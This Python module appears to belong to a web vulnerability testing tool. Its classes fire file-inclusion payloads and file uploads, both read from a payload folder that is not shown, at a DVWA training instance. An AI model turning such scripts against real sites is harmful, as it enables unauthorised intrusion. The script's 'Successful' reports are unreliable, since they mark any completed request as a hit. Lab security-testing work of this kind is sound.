from pathlib import Path
from attacks.baseClass import AttackSession
from utilities.report import eventHandler
import os
import time

class RFI(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        fileInclusion("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        fileUpload("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()

 

class fileInclusion(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="File Inclusion")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/fileInclusion.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/fi/?"+line.strip()
                try:
                    session.get(url)
                    self.events.sendMessage("Successful","File Inclusion",line.strip())
                except:
                    self.events.sendMessage("Blocked","File Inclusion",line.strip())
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","File Inclusion","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","File Inclusion","Attack completed")
        self.events.disconnect(self.events.callback,sender="File Inclusion")


class fileUpload(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="File Upload")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/fileupload").resolve()
        for filename in os.listdir(file_path):
            f = os.path.join(file_path,filename)
            url =  self.host + "vulnerabilities/upload/"
            data = {'MAX_FILE_SIZE': 100000,
                     'Upload': 'Upload'}
            files = {'uploaded': open(f,'rb')}
            try:
                session.post(url,files=files,data=data)
                self.events.sendMessage("Successful","File Upload",f.strip())
                time.sleep(1)
            except:
                self.events.sendMessage("Blocked","File Upload",f.strip())
    def startAttack(self):
        self.events.sendMessage("Information","File Upload","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","File Upload","Attack completed")
        self.events.disconnect(self.events.callback,sender="File Upload")